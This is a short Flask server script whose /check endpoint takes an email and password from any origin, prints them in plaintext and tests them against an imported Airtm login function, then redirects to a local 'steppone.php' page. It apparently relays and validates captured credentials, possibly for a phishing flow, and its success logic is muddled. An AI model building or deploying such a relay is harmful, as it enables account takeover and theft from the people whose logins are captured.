from flask import Flask, request, render_template, json, redirect, jsonify, make_response
from flask_cors import CORS
from love1 import all
from airtm_api import login

import datetime

app = Flask(__name__)
CORS(app)

@app.route("/",methods=['GET'])
def index():
    print('YEAH')
    #info = all()
    #current_date = datetime.datetime.now()
    #datex = current_date.strftime('%A, %d de %B de %Y a las %I:%M %p')
    #return render_template("index.html", date=datex, infox=info, main_url='http://localhost:5000'), 200
    #return "Hello, World! > {} ".format(talfickson), 200

@app.route("/check",methods=["POST"])
def login2():
    if request.method == "POST":
        user_agent_received = request.get_json()
        print(user_agent_received)
        res = login(user_agent_received['email'],user_agent_received['pass'],True)
        try:
            if res['status'] == False:
                print('SUCCESS LOGGED')
                return redirect('http://localhost/appwe/steppone.php',302)
        except:
            payload = {'error': 'Please check your credentials...'}
            return str(payload), 400
app.run(host='0.0.0.0',port=80)